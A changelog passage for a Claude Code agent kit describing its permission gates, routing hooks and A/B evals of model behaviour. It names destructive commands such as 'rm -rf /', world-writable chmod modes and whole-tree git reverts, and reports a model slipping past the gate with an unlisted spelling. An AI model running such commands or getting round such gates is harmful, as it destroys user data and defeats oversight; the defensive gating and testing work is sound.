  command runs and removes the *accident*, the shell is Turing-complete so a determined rewrite can reach
  around any pattern, and a hard boundary means a devcontainer or a VM — which `/doctor-csk` already reports on.
- **The mandatory security and privacy audits ran on a weaker model than the code they were reviewing.** Both
  were pinned `model: sonnet`, set in the July 8 rename commit and never revisited across 156 commits. An
  omitted `model` field means `inherit` — the model the user picked for the session — so on an Opus session the
  experts wrote code on Opus and the gate that clears them ran on Sonnet. That is backwards for the one review
  this kit calls mandatory, and it is the opposite of what Claude Code does with its own built-in Explore
  agent, which inherits the session model *capped* upward so it "never runs on a more expensive model than the
  one you already chose" — inherit, cap up, never force down.
  Both pins are gone. `security-expert-csk` buys its extra rigour with **`effort: high`** instead: more
  thinking on the user's own model rather than a different tier. `session-manager-csk` also loses its `haiku`
  pin — the handover is a synthesis over an entire session that decides what the next one knows, and its
  failure mode is silent. `commit-agent-csk` keeps `haiku` deliberately: turning a staged diff into a
  Conventional Commit is mechanical, and §4.1/§4.4 are gated, so a slip is caught rather than shipped.
  Two new gates so this cannot come back quietly: a `model:`/`effort:` value must be one the docs define (an
  unrecognised one does not error — Claude Code skips it and silently runs the inherited model, so a typo
  looks like it worked), and the mandatory audit agents must stay unpinned. Verified by injecting each
  deviation and confirming the matching case goes red.
- **Nothing in the suite ran a hook the way Claude Code runs it.** All 300-odd gate cases pipe into
  `bash "$HOOKS/<hook>.sh"`, which supplies the interpreter and ignores the shebang — so a lost execute bit or
  a CRLF line ending, the two failures an installer can actually introduce on Windows, survived every single
  case and would have died in a real session. One case now executes the hook **as an executable**, the way
  `settings.json` invokes it. Verified on a real install in three states: intact passes, `chmod -x` gives 2
  errors, a CRLF shebang gives 1.
- **The route-hint cases failed on every pruned profile.** §7y asserts that the hook names
  `backend-expert-csk` for a backend request, but a `--frontend` install prunes that agent, so the hook
  correctly said nothing and the case failed it for obeying its own rule — naming an agent that is not
  installed is exactly the wrong route those cases exist to prevent. A case now skips, visibly, when its owner
  is absent. This reached CI because `e2e.sh` runs the INSTALLED suite inside six pruned profiles while only
  the source tree had been checked locally; it failed with `rc=1` and no output, the same `set -euo pipefail`
  signature this repo has been bitten by before.
- **The brand mark had three hand-kept copies and no gate.** Four SVGs were down as orphans to delete on the
  strength of a grep that could not see them being used — because two of the uses are not file references (the
  published site inlines the mark as a `data:` URI favicon, `gen-network.py` hand-copies the same rects into
  the diagram core), and because the grep ran over the working tree while `gh-pages` is a separate branch.
  `assets/favicon.svg` was byte-identical to `assets/icon.svg` and is gone; `icon.svg` is now the single
  source, `gen-network.py` says so at the copy site, and `check-gh-pages.sh` compares all three on shape
  rather than bytes. `logo-light.svg` and `mark.svg` stay — light-background and transparent variants of a
  logo the READMEs do use.

### Changed
- **The README led with the half of the kit that has the least evidence behind it.** The old opening sold
  "gates, not reminders" — and the measurement says the opposite of what that implies: across the A/B suite the
  only case where the two arms separated was won by the always-on *discipline text*, with `guard-bash` never
  firing. Meanwhile the strongest, most falsifiable number the project owns — delegation going from **0 of 24**
  to **39 of 48** — sat in a single table cell, and `evals` appeared **zero times** in either README, so the
  one thing hardest for anyone else to copy (an A/B harness whose negative results are published) was invisible.
  The opening is now three claims with a number behind each: the specialists run, the rules are gates, and
  **it says what it has not proven** — linking straight to the six level results and to the awkward attribution
  above. The comparison table's left column was a strawman ("typical agent kit / prompt collection"); it is now
  **Claude Code with a `CLAUDE.md`**, which is not a competitor at all but the exact control arm the harness
  measures, so the table can be checked rather than taken on faith. `adopt` moved up out of a table row: it is
  the situation most readers are actually in. the gate units were being re-run in every pruned profile.** The step
  breakdown put 77m29s of it in the e2e rehearsal, which runs the installed smoke-test seven times — and one
  run spawns 136 hook processes, each spawning `jq`, which is what Windows charges for. Those cases drive hook
  binaries the installer copies unchanged, so six profiles re-verified identical bytes six times.
  `CSK_SMOKE_SCOPE=install` skips them: **136 hook processes drop to 9, 304 cases to 165**, and everything
  profile-dependent still runs in both scopes — counts, frontmatter, routing, §7y, commands, settings, plugin,
  doctor, adopt. The skip prints a note so a short run is not mistaken for full coverage, and install scope
  adds the executable-invocation canary above. Full scope stays the default and is what CI's standalone
  smoke-test step runs.
- **A gate that returned the wrong exit code was scored as a working gate.** A PreToolUse hook has exactly two
  answers: `0` allows, `2` blocks. Anything else — a syntax error, a missing interpreter, an unbound variable
  under `set -u` — means the hook *died*, and Claude Code runs the tool anyway. Thirty-five assertions in
  `smoke-test §7` tested the three PreToolUse hooks with `&& fail || pass` or `if …; then fail`, which treats
  every non-zero exit as a block, so all of them passed a hook that was failing open. Measured rather than
  argued, twice:
  - one §4.5 rule changed to `exit 1` — the world-writable `chmod` gate, so `chmod 777` actually runs — left
    the old suite **fully green**; the new one reports 16 errors;
  - `guard-commit-scan.sh` changed to `exit 1` — the plugin edition's **only** commit content gate failing
    open entirely, so an AI trace or a live secret walks into a commit — also left the old suite **fully
    green**; the new one reports 4.

  All thirty-five now require exactly `2`. Same class as the M1 fallback hole from the 1.4.0 audit, and it was
  found by injecting a deviation into the new observability channel below rather than by reading the code.
  The remaining gate scripts were audited the same way and are covered as they stand: `guard-write.sh` (2
  errors under the same injection), the five non-blocking hooks (`context-usage`, `route-hint`,
  `session-guard`, `session-rehydrate`, `skill-trust` — graded on output, so a dead one goes red), and the
  git-hook/CLI gates (`pre-commit`, `commit-msg`, `doctor.sh`, `scan-skill.sh`), where git and the CLIs treat
  any non-zero as a failure, so a crash fails **closed** rather than open.

### Added
- **The gates can now be observed firing.** `CSK_GATE_LOG=<path>` makes `guard-bash.sh` and `guard-write.sh`
  append one TSV line per decision — `BLOCK`/`ASK`/`ALLOW`, section, rule, command. Absent unless the operator
  exports it, write-only, and logged after the verdict is settled, so it cannot influence one.
  It exists because **"the model never reached for the command" and "the gate stopped it" leave behind
  identical artifacts.** `evals/permission-pressure` — the one case where the arms separated — had to report
  "`guard-bash` never fired" as an *inference*, and that inference is the whole difference between evidence for
  the always-on discipline text and evidence for the tool gate. `evals/run.sh` now prints a "gates fired" line
  beside each score. It is **reported, never scored**: a channel only the kit arm can produce cannot enter the
  denominator without handing the kit points the control is structurally unable to earn.
  Eight cases in `smoke-test §7k`, four of them verified by injecting a deviation and confirming the matching
  case goes red — including the one that exposed the exit-code hole above.
- **`evals/uncommitted-preserved`** — a failed experiment to undo before a demo, with an unrelated uncommitted
  change sitting in the same tree. `SESSION_STATE` had this case down as unbuildable: to measure "rule → gate"
  you need a run where the model actually *attempts* a §4.5 command, but a prompt that pushes hard enough to
  cause that IS the explicit user request §4.5 already permits. The way out is that the gated command does not
  have to be the goal — here the user asks for something entirely legitimate and the whole-tree revert is
  merely the fastest instrument to hand, so §4.5 applies at full strength and the model reaches for it, or
  does not, on its own. The experiment spans three files against one `.` that does the same job; the prompt
  never says checkout, restore, reset or clean. Graded on whether the unrelated work is still *recoverable*
  anywhere — `git stash` satisfies it and costs one command — because §4.5 gates irreversibility, not reverting.
  **It is the sixth zero: 12/12 against 12/12 across three fixture variants and 18 sessions.** In all nine
  control runs the bare arm noticed the fourth modified path from `git status`, said so, and left it alone.
  Two of the three variants exist because the fixture was planting the answer — a demo-note line and then a
  code comment, each quoted back verbatim by the control as its reason — and removing them changed nothing.
  Every round is published in `evals/README.md`, and the grader was dry-run against five hand-built outcomes
  (4/4 · 3/4 · 3/4 · 2/4 · 1/4) before any model saw it. Same diagnosis as `ambiguity-surfaced`: not "the kit
  does nothing" but **the control saturated**. No §4.5 gate fired in any of the nine kit sessions — and that
  is now a reading off the gate log rather than an inference from a transcript.

### Verified
- **PreToolUse hooks run under `bypassPermissions`, and `exit 2` is honoured there.** `guard-bash.sh` has
  asserted this in a header comment since it was written, and the A/B harness runs every case in that mode, so
  a wrong assertion would have quietly invalidated the whole suite. Probed directly: a hook logged
  `mode=bypassPermissions` for both commands it saw and denied the second, which did not run.
- **An untrusted workspace drops `permissions.allow` entries and nothing else.** A probe project carrying both
  an allow entry and a PreToolUse hook produced the exact `has not been trusted` warning — and the hook still
  ran and still returned `exit 2`. So a gate result measured in an untrusted scratch project is valid, and the
  runner's warning no longer implies otherwise. Only cases that need a pre-approved permission are affected.
- **The specialists now run on a plain prompt.** The kit's premise is that a task lands with the agent that owns
  it, and measurement said that never happened: across the eval suite, two A/B pairs and a twelve-agent domain
  sweep, a focused single-domain request produced **0 delegations in 24 sessions**. Three fixes were tried and
  all three scored zero — rewriting every agent `description` into ownership language, adding a concrete "call
  the Agent tool with subagent_type" paragraph to the discipline, and putting `Task`/`Agent` in the harness tool
  list. The subagents docs name three inputs to the delegation decision — the request, the `description` field,
  and current context — and the kit had only ever touched the last two.
  `route-hint.sh` is the first: a `UserPromptSubmit` hook that classifies the request against the installed
  agents' trigger phrases and returns `additionalContext`, which the docs place "alongside the submitted
  prompt". **Measured 39 of 48 across four rounds, against a 0-of-24 baseline.** Every one of the nine misses
  is accounted for and none of them is a refusal to delegate: five were a fixture that asked for work the
  project did not contain, two were the sandbox's untrusted-workspace permission problem, one was a reasoned
  inline decision that named the agent it considered, and one was an invented "operator config" that exists
  nowhere on the machine.
  The wording is the whole mechanism. A first version hedged — "unless it is a one-line edit", "if it is
  genuinely not that agent's work, say so" — and scored **4 of 12**, because a written escape hatch gets used.
  The docs give the phrasing that works verbatim ("Use the test-runner subagent to fix failing tests"), and that
  is what ships. An agent always outranks a skill when both match: the agent applies its own skills anyway, so
  naming it delivers the method plus the isolation and the audit path.
  It stays silent when no match is clear, ships in both editions, and carries six smoke-test cases — four owners
  and two silences, one of which pins the `build`/`ui` false positive that used to send CI failures to the
  frontend expert.

## [1.10.1] - 2026-07-30

Reported from a real install: a design request produced a good analysis and no delegation. Nothing here is new
functionality — it is the routing layer catching up with what the kit already claimed to do.

### Fixed
- **The agents were not running, and widening their vocabulary was not the fix.** This started as a report that a
  design request produced a good analysis and no delegation. Two rounds of trigger-phrase work later, the question
  was finally *measured* instead of theorised, in a clean install with the delegation tool available: a task
  squarely inside `frontend-expert-csk`'s domain produced **0 delegations on its own** — with the old description
  and with a rewritten "owns everything the user sees" one — while `/review`, whose body @-mentions its agents,
  produced **3 of 3**. The official docs say Claude decides delegation from the request, the `description` field
  and the context, and offer no way to force it; `@agent-<name>` is the one form that guarantees a subagent runs.
  So **the commands now @-mention their agents** (`/plan`, `/brainstorm`, `/review`, `/ship`), the discipline
  states that naming an agent in prose is a hope and `@agent-` is a guarantee, and both READMEs teach the escape
  hatch. Verified live, not assumed: `/review` on a clean install invoked `review-agent-csk`,
  `security-expert-csk` and `performance-expert-csk`.
- **The A/B harness could not delegate at all.** `evals/run.sh` passed `--allowedTools Bash Read Write Edit` —
  `Task`/`Agent` were absent, so every result it has ever produced was measured with the agent layer switched off,
  against a kit whose central claim is the agent layer. The flag is fixed and `evals/README.md` now carries the
  caveat above its results table rather than quietly leaving six "no difference" rows to be misread.
- **`doctor.sh` now reports whether delegation is switched off.** Denying the `Agent` tool in `permissions.deny`
  is the documented way to stop every subagent, and the only symptom is that all work quietly happens on the main
  thread — which reads as a broken kit rather than a setting. Checked at project, local and user scope.
- **The session line stopped announcing its own failure every turn.** `🔋 Session: could not measure` on every
  reply is noise that reads as a broken kit. The rule now: no reading → run the command once; if that also fails,
  say so once and drop the line.
- **Agent descriptions were inviting the model to stay inline.** `backend`, `database` and `frontend` each ended
  with a clause like "small tweaks stay inline" — the model could take its excuse from the agent's own
  description. Replaced with ownership: "Use proactively — owns everything the user sees or interacts with… any
  request about it is yours whatever its size, wording or language."
- **Agents were unreachable by the words users actually type.** The skills carried the user's vocabulary —
  `frontend-design` triggers on "visual design", "typography", "spacing" — so the skill fired, the route trace
  printed, and every gate stayed green while the *agent* that owns the work carried only structural vocabulary:
  screen, component, page, navigation, state management. "The app doesn't look premium, the icons are
  inconsistent" matched no agent at all, so a token layer across fifteen screens stayed on the main thread.
  `frontend-expert-csk` gains visual design · design system · design token · dark mode · look premium, and its
  "use proactively" clause now names visual work — that clause, not the trigger list, is what the harness reads
  when it decides whether to delegate. `performance-expert-csk` gains memory leak and laggy;
  `systematic-debugging` gains "is broken" and "crashes", which is how an unknown cause actually gets reported.
- **A short trigger matched inside a longer word.** `UI` matched `build`, so "the build fails on CI" routed to
  the frontend expert — a wrong route is worse than none, because it looks like the kit worked. The trigger is
  now `UI polish` and the matcher is word-bounded. Found while verifying that: a bare `token` trigger sent
  "design token layer" to the session-context skill; now `token budget` / `token cost`.
- **`token-budget` had no positive routing case at all.** Narrowing a trigger has to be paid for with one, or
  the fix for a wrong route quietly creates an unreachable component.

### Added
- **Ten golden routing cases, seven of which assert an AGENT** for a sentence a person would really type. The
  old design case asserted the *skill*, which is why the gate proved a mapping existed and never proved a real
  sentence reached the delegation layer — the same shape as the gate holes fixed in 1.10.0.
- **How to GET a release, per channel.** The plugin channel documented `/plugin marketplace add` and stopped.
  An installed plugin stays on the version it was installed at until someone asks for a newer one, and
  `claude plugin update` needs a restart, so nothing about it is automatic. Both READMEs and the npm README now
  carry `claude plugin marketplace update` + `claude plugin update`, verified against `claude plugin --help`
  rather than recalled. This had teeth: 1.10.0 closed three §4.5 holes, and a plugin user with no upgrade path
  keeps all three. The `release` skill gets the standing check — every channel must have a documented way to
  receive the version, because publishing and reaching users are different events.

### Changed
- **The `Trigger phrases:` lists moved out of the agents' `description` field into the body.** The official
  contract calls `description` "when Claude should delegate to this subagent", and that is the field Claude reads
  to decide — fifteen quoted keywords sitting in it compete with the sentence that states *when*. `routing-eval`
  greps the whole file, so the routing set is unchanged, and agent frontmatter fell 5,936 → 4,261 bytes.
- **The README no longer claims the agents "auto-chain".** They chain because the commands @-mention them.
  Automatic delegation is a model judgement in any kit; where it must happen, the kit no longer leaves it to
  chance, and the README says which is which.
- **The upstream attribution list is gone**, except the one a licence requires. `google/eng-practices` stays in
  one line: it is CC-BY 3.0 and `code-review` is an adaptation, so attribution is an obligation, not a
  courtesy. Two DevArchitecture mentions are deliberately kept and are not attributions — `--dotnet` genuinely
  clones that repository, so the sentence describing the installer would become false without it.
- The discipline shrank 182 bytes as a result; always-on went 28,858 → 28,697 even after everything added
  above. The attribution list was carried into every session and taught the model nothing.

## [1.10.0] - 2026-07-29

Three §4.5 rules that could be walked around, and the measurement that found the first one. All of it comes
from a single observation: **a gate that matches one spelling of a command has protected nothing.**

### Fixed
- **The world-writable rule matched the string, not the state.** `chmod 777`, `0777`, `a+rwx` and `+rwx` were
  blocked; `1777`, `2777`, `666`, `646`, `o+w`, `a+w` and `o=rwx` all reached exactly the same place and all
  passed. This was not found by reading the pattern — the A/B harness found it. Asked to open a directory
  "wide enough for any account", the uninstrumented model reached for `chmod 1777`, sticky bit and all: the
  one spelling nobody had thought to write down. The rule now matches any mode whose result is writable by
  other, and `755`, `644`, `775`, `u+w` and `chmod +x` are pinned as cases so widening it did not cost a
  false positive.
- **`rm -rf` was case-blind and long-flag-blind.** `rm -rf /` was blocked while `rm -Rf /`, `rm -fR /`,
  `rm -f -r /` and `rm --recursive --force /` were not. The target scoping (`/` · `*` · `~`) is deliberate and
  unchanged — `rm -rf build` is a routine local delete, and a gate that fires on it is a gate people learn to
  work around. **The rule had no test case at all**, which is why it went unnoticed for eleven releases; it
  now has sixteen.

### Added
- **A whole-tree `git checkout -- .` / `git restore .` is gated (§4.5).** It destroys every uncommitted change
  with no reflog and no undo — the same loss as `reset --hard`, which has been gated since the beginning, by a
  command that was not. A verification subagent ran exactly this over uncommitted work in this repo and took
  the working tree with it. Reverting one *named* file stays allowed: everyday, recoverable, and gating it
  would make the rule noise. `git -C <path>` and `git -c k=v` cannot walk around it, and a commit message
  containing the word "checkout" does not trip it — both pinned as cases.
- **`permission-pressure`, the first eval case to show a difference.** Five earlier cases asked the model to do
  an obvious good thing, politely, and the base model already did it. This one supplies a deadline, a plausible
  reason and a nudge toward the blunt instrument, because that is the shape a request has when careful
  behaviour actually fails. Kit 12/12 against bare 9/12: on the signal check the split is total — bare made the
  directory world-writable in 3 of 3 runs, the kit in 0 of 3. Graded on file modes, which are integers.
- **43 gate cases** across chmod, `rm` and the whole-tree revert — every spelling that must be blocked and
  every neighbour that must not.

### Changed
- §4.5 in the discipline now says *a world-writable `chmod`* rather than `chmod 777`, and names
  `git checkout -- .`. 27 bytes of always-on cost, spent deliberately: a user told a narrower rule than the one
  that fires reads the block as a bug and works around it.
- **The mechanism behind that 3-of-3 result is not the one the kit's design predicts, and the README says so.**
  `guard-bash.sh` never fired — the kit arm never attempted the command, declining on its own and citing the
  rule, because the discipline was in its context. That is evidence for the always-on text, not for the tool
  gate, and the two claims are not interchangeable.

## [1.9.0] - 2026-07-29

### Added
- **The commit content gate reaches the plugin edition** (`guard-commit-scan.sh`). A plugin ships Claude Code
  hooks, not git hooks, and cannot set `core.hooksPath` — so a plugin-only install had the commit *approval*
  gate and none of the commit *content* gates: a credential or an authorship trailer could land there while the
  other three distribution channels stopped it. One of four channels was quietly weaker, and nothing said so.
  The hook runs the real `pre-commit` and `commit-msg` scanners from PreToolUse rather than re-implementing
  them — a second matcher is how a gate passes while the thing it guards is broken. It reads `-F <file>`,
  covers `git commit -a` (where at that moment the content is still unstaged), and refuses the editor path only
  where no `commit-msg` hook can scan it afterwards.
- **Four records the kit expected but never wrote down.** `[NEEDS CLARIFICATION: <the question>]` markers in
  `spec-planning`, so an unresolved ambiguity survives into the artifact instead of being filled in with the
  likeliest reading — and no acceptance criterion may contain one. A bypass line in `confidence-check` and
  `adr`, so a gate that was weighed and overridden stops being indistinguishable from one that was missed;
  `revisit:` is the load-bearing field, since a bypass with no condition attached is permanent by default. A
  `complete / partial / unknown` coverage ledger in `security-scan`, promoted to an invariant rule, because
  "no findings" and "never looked" otherwise read identically to whoever acts on the report. And the micro-test
  method in `eval-grader`: sample a wording against a no-guidance control and read every run by hand.
- **The installer names the vendored front-end assets up front** (`start.sh`). The .NET base carries ~8 MB
  under `wwwroot/lib/**/dist/`, and the repo-bloat gate stops the first commit over them. That is the gate
  working — whether to commit third-party assets is a real decision — but meeting it at `git commit` time on a
  project you have not written a line of reads as breakage. The count, the path and the two ways out are stated
  while the context is obvious.
- **An A/B eval harness** (`evals/`, repo-internal — it is not part of an install). The same prompt in a
  kit-installed project and a bare one, graded on what is left on disk and never on the transcript, with both
  arms given identical tool access. Wired into no gate and no CI job: it costs real tokens.

### Fixed
- **`CLAUDE_GIT_OK` never actually pre-authorised anything.** The key had one purpose — let a headless or CI
  session commit with nobody at the keyboard — and did not achieve it: the hook answered exit 0, which means
  "this hook has no opinion", while `settings.json` also asks for `git add` and `git checkout -b`. Those rules
  stayed in force, so a keyed session could not even stage, and §4.4 advertised the flag as the way to work
  unattended. It now returns an explicit allow for the approval-gated set, reached only after the §4.5 blocks —
  a pre-authorised session still cannot force-push, amend, `reset --hard` or `git add -f`.
- **§4.1 stopped a fresh install from making its first commit.** The trace pattern matched the bare words
  `Generated by` / `Generated with`, which is the header written by every code generator in existence — a Dart
  lockfile, an EF Core scaffold, protoc, openapi-generator. A `--dotnet` install clones a base that carries one,
  so a greenfield project could not commit at all. The rule is about authorship by a model, and the pattern now
  requires that context nearby; both false-positive classes are pinned as clean cases.
- **The README's network diagram announced the wrong size.** The picture was regenerated as the kit grew, but
  its subtitle was typed by hand and stayed at "11 agents × 36 skills" while the diagram itself drew 12 and 38.
  It is the one claim in that image a reader takes at face value, because nobody counts 38 nodes. The subtitle
  is derived from the data that draws the diagram now, and the checked-in SVG is compared against the payload
  by the README catalogue gate, which already runs in CI.
- **The stated always-on cost was a release out of date.** Both READMEs said ~26 KB and ~10k tokens; the
  measured figure is 28,605 bytes, about 12k tokens on a real turn. The byte budget was gated and the sentence
  describing it was not.

### Changed
- Two skill bodies moved recipe material into references: `vps-deploy` (−669 B, proxy/SSL file contents) and
  `db-migration` (−1103 B, the nine-tool matrix). A project uses one proxy and one migration tool, not all of
  them; the decisions stay in the body.
- `bypassPermissions` is no longer carried as an open question. The published hooks reference documents
  `permissionDecision`, documents the permission modes, and says nothing about how the two interact — so there
  is no contract to rely on, and a gate resting on observed-but-unspecified behaviour is a bug even while it
  happens to work. Failing closed is a decision now, not a pending measurement.

## [1.8.0] - 2026-07-28

### Added
- **`confidence-check` skill** — the kit's only gate that fires *before* implementation. Review, the DoD and the
  commit approval all catch bad code; none of them catch correct code that duplicates something already in the
  tree or is built on a recalled API shape, because what reaches a reviewer is a clean diff. Five checks answered
  with evidence rather than recollection, and any "no" is a stop. Deliberately not a weighted score: with five
  checks and any sane bar a single failure sinks it anyway, so weights would only decorate a binary decision.
- **`dependency-upgrade` skill** — the acting half of dependency work, split from `dependency-audit`, which had
  promised "outdated packages" in its description and never taught it. Asks vulnerable, deprecated and behind as
  three separate questions, classes every target version patch/minor/major, lands security fixes first and alone,
  never applies a major automatically, moves manifest and lockfile together, and treats a green build plus a green
  suite as the only evidence an upgrade worked.
- **`performance-expert-csk` agent** — security, privacy and tests each had an independent reviewer; performance
  was the one quality axis where the author of a change audited their own hot path. Read-only, like the security
  auditor. Built around the tension that makes such an agent risky: the `performance` skill says measure before
  optimising, so anything read off a diff is reported as a *candidate* with the measurement that would settle it,
  and only a number promotes it to a *finding*.
- **`session-stats.sh`** — reads what a session actually did off the transcript (failing tool loops, repeated
  prompts, interrupts, compactions, delegation rate) so `reflect` and `handoff` rest on the record instead of the
  model's recollection of its own work. Wired to no hook event; run on demand.
- **`skill-trust.sh`** — a skill file is executable instruction, and they arrive by routes nobody reviews. At
  session start, any component the kit never shipped and the user never accepted is named, with the supply-chain
  scanner's verdict. Acceptance is deliberate and recorded as a digest, so an edit after acceptance comes back.
- **Project-readiness block in `doctor.sh`** — advisory, never changes the verdict: is the CLAUDE.md project
  section filled in, is there a project-specific skill, a devcontainer, an MCP server, and has CLAUDE.md drifted
  behind the code.
- **`.claude/kit-manifest.txt`** — written by both installers from the payload, so kit-owned and project-owned
  components can finally be told apart.
- **Rule precedence in the discipline** — what wins when two rules collide: prohibitions and safety, then the
  user's explicit instruction, then scope as asked, then quality, then speed.

### Fixed
- **The discipline could sit on disk and never load.** `.claude/DISCIPLINE.md` is inert unless `./CLAUDE.md`
  imports it, and every existing check was blind to that: hooks fire, gates look live, and routing, the DoD and
  session management never enter the context. `doctor.sh` now fails on it.
- **A compaction disarmed the session gate.** `/compact` keeps the same session id, so the once-per-threshold
  markers survived it: a session warned at 90% could compact, fill right back up and never be warned again.
  Markers are keyed by compaction generation now, and an automatic compaction is reported once at any fill.
- **A credential could be read even though it could not be committed.** `.env` was the only credential file
  either gate covered, leaving SSH private keys, AWS credentials, kubeconfigs and `.netrc` open. The commit scan
  catches a secret leaving the repo; nothing caught one merely read into the context.
- **A `--generic` install lost routing.** The generic backend variant did not route `confidence-check` or
  `sonarqube-check`. The orphan check could not see it — both are routed by *some* agent, so nothing is orphaned;
  they were simply unreachable on that stack. A parity gate now covers it.
- **One high-severity hit scored as safe.** A single finding cost 10 points and landed on exactly 90, the SAFE
  line, so one credential-exfil line or one injection directive passed on arithmetic. Severity now floors the
  verdict, and the exfil pattern matches both phrase orders instead of only reader-then-path.
- **The test runner was pinned to one stack.** The test agent and the `testing` skill named `dotnet test` as
  their definition of done in components that ship to every profile, including frontend- and mobile-only ones.
- **The published site had no gate.** It is hand-written with no source in the repo and no build step, and it
  drifted the obvious way — 1.7.0 updated its counters and forgot the version marker. The release workflow now
  compares the site's version and counters with the payload before publishing.

### Changed
- Every pattern in `trace-blocklist.txt` and `secret-blocklist.txt` carries its own case on the line below it,
  and the suite runs all of them through the real `pre-commit` rather than re-implementing the match — a second
  matcher would pass while the real one was broken. A pattern with no case fails the suite.
- The blocklists' self-exclusion is matched by file name instead of one installed path; anchored to
  `.claude/hooks/`, it stopped applying in the kit's own repo, which scanned its own pattern list.

## [1.7.0] - 2026-07-20

### Added
- **`threat-model` skill** — scope a security audit *before* scanning, to cut false positives. It maps assets,
  entry points, trust boundaries and 5-8 domain-specific attack classes into a parseable `docs/THREAT_MODEL.md`;
  `security-expert-csk` runs it first and `security-scan` then reviews that surface. A threat survives a patch; a
  vulnerability is only evidence for one.
- **`eval-grader` skill** — measure the quality of a generative task instead of vibing it: a two-layer grader
  (deterministic code metrics + per-dimension LLM-as-judge), signed deltas against a pinned baseline, and a
  `pass-slow` verdict that grades cost alongside correctness — the external, machine-grounded verifier `iterate` asks for.
- **An agent/skill network diagram** in the README — a data-driven map (`assets/network-*.svg`, built from the repo by `packaging/gen-network.py`) of all 11 agents, 36 skills, and their real `applies` relationships.

### Changed
- **`security-scan` gained an adversarial verification pass** — N independent verifiers that start from the code
  and hunt for why a finding is *wrong*, a false-positive exclusion taxonomy, a `CANNOT_VERIFY` verdict, and
  severity derived from **preconditions × access** rather than the vulnerability category (`references/verify.md`),
  plus defensive-security prompting rules (`references/prompting.md`).
- **`AGENT_TEMPLATE.md`** now covers decomposing along the tool < skill < subagent cost axis and requiring a typed
  contract between stages.
- **`frontend`** documents a verify-by-contract runtime convention — `data-verify-*` attributes, a `window.__verify`
  handle, and the `PASS/FAIL/BLOCKED/SKIP` taxonomy (`references/verify-contract.md`).
- **README restructured for reading order** — the feature inventory and network diagram surface *before* the install
  reference; the two differentiation tables are merged into one; the update mechanics collapse into a details block.

## [1.6.3] - 2026-07-17

### Fixed
- **`/update-csk` no longer hangs at npx's own install prompt.** The command ran `npx @…@latest update --here --yes`
  — the trailing `--yes` reaches the updater, but `npx` *itself* prints `Ok to proceed?` when it first installs the
  package, a prompt that reads the real TTY and ignores piped input, so an agent-driven / non-interactive run blocked
  before the kit even started (the update silently never happened). The command now runs `npx --yes @…` so npx's own
  `--yes` auto-confirms the install and `/update-csk` completes unattended. (1.6.1 fixed the updater's own prompts;
  this fixes the npx layer above them — both are needed for a clean unattended refresh.)

## [1.6.2] - 2026-07-17

### Changed
- **A fresh install auto-runs ordinary commands; only commit/push and destructive ops interrupt you.** `settings.json`
  now ships `permissions.allow: ["Bash"]`, so everyday commands (build, test, `ls`, `git status` …) run without a
  prompt in the `default` and `acceptEdits` modes. `git add/commit/push/checkout -b` and `ssh/scp/rsync/docker` still
  prompt — an `ask` rule always wins over `allow` — and destructive / RCE / gate-tamper commands stay hard-blocked by
  `guard-bash.sh` (its `exit 2` overrides `allow`). Note: the classifier-based `auto` mode intentionally drops a
  blanket `Bash` allow, so there it defers to the classifier.
- **Decision points ask with the `AskUserQuestion` tool.** The discipline now directs the model to ask with structured
  single/multi-select options at every decision point — never prose the user must type back, and never skipping the
  question — instead of the old "numbered options" prose. (This is model discipline, not a hook-enforced gate.)

## [1.6.1] - 2026-07-16

### Fixed
- **`update` / `adopt --yes` no longer hangs under a TTY.** The confirmation prompts tested for a TTY *before*
  honoring `--yes`, so an unattended run that inherited a pseudo-terminal (Claude Code drives shell commands under a
  pty on Windows) blocked waiting for input that never came — `/update-csk` timed out with nothing changed. `--yes`
  is now checked first at every gate, including the agent-overlap (`owner`) and off-repo prompts that did not route
  through the shared helper. A pty-based regression test (`e2e.sh` `[adopt-pty-yes]`) allocates a real terminal and
  asserts an unattended refresh completes, so this class of hang cannot return.

## [1.6.0] - 2026-07-16

### Added
- **No idle components — a routing invariant, now enforced.** Every skill and agent must be *routed*: named by an
  agent, a command, or the discipline's trigger map. `smoke-test.sh` (§3b) fails if any component is reachable only
  by its own description. Four previously-unrouted main-thread skills — `iterate`, `reflect`, `worktree`,
  `mcp-builder` — are wired into the trigger map, so nothing ships dark.

### Changed
- **`sonarqube-check` is local-first and self-bootstrapping.** Instead of pointing at a shared or remote SonarQube
  server, the gate installs the project language's local, server-less analyzer when none exists and runs it in place
  — .NET → `SonarAnalyzer.CSharp` Roslyn NuGet at build time (`TreatWarningsAsErrors`); JS/TS → `eslint-plugin-sonarjs`;
  and the language-native equivalents elsewhere. A full SonarQube dashboard becomes optional, only when a project runs
  its own instance. The Definition-of-Done gate follows the same wording.

### Fixed
- **The orphan-routing check is grep-portable.** The §3b matcher drops the `^`/`$` line-anchor alternation that ugrep
  matches unreliably and no longer folds the search term into its own file-argument list, so the gate is correct under
  GNU grep, BSD grep, and ugrep alike.

## [1.5.1] - 2026-07-15

### Changed
- **The stale agent-name check now follows CLAUDE.md's reference chain.** `doctor` and adopt's install-proof stage
  no longer scan only `CLAUDE.md`; they also scan every local doc it points to (its `@import`s and `docs/…md` paths),
  so an orchestration doc like `docs/AGENTS.md` that a takeover left naming the old bare agents is caught too.
  Unreferenced design/audit docs and code comments are ignored, so it stays complete without false positives.

### Fixed
- **A takeover now completes its own migration.** When `adopt` renames the project's agents to their `-csk` ids, it
  rewrites every bare reference to them across CLAUDE.md's reference chain (boundary-safe: `-csk`/`-local` suffixes and
  longer words are left intact), so delegation to a renamed agent no longer silently fails. The edit lands on the adopt
  review branch, visible and revertible; hand-authored prose outside the chain is never touched.

## [1.5.0] - 2026-07-15

### Added
- **Diagnose-first routing.** The orchestration workflow now opens with a diagnosis step: a cross-domain bug whose
  root cause is unknown routes to `general-purpose` applying the `systematic-debugging` skill *before* planning —
  unclear scope is not the same as an unknown cause, and you cannot sequence a fix you cannot locate.
- **A one-line route trace on every task.** Each task opens with `🔧 <agent>` (delegating) or `🔧 inline · <skill>`
  (main thread) plus a reason, so the kit's delegate-or-inline work is always visible instead of silent.
- **`doctor` + adopt detect stale agent names.** A brownfield takeover renames the project's agents to `-csk` ids,
  but the project `CLAUDE.md` may still name the old bare agent — a reference that matches no installed agent, so
  delegation to it silently fails. `doctor.sh` and adopt's install-proof stage now report each such reference with
  its `CLAUDE.md` line and the correct id (auto-delegated agents as a failure, pull-only agents as a consistency
  note). Detection only; hand-authored prose is never auto-rewritten.
- **A smoke-test gate for auto-delegation cues.** Every non-pull agent description must carry an action cue
  (`use proactively` / `immediately after`), so a passive rewrite can't silently stop the specialists from firing.

### Changed
